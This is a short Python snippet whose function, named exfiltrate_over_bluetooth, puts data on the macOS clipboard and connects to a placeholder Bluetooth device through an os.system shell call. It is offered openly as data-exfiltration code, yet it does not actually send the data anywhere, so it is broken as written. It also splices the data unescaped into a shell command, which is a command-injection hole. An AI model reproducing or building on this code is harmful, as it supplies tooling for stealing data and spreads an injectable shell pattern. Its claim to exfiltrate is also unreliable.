import os

def exfiltrate_over_bluetooth(data):
    target_device = '<藍牙裝置名稱>'
    command = f'echo "{data}" | pbcopy && blueutil --connect {target_device}'
    os.system(command)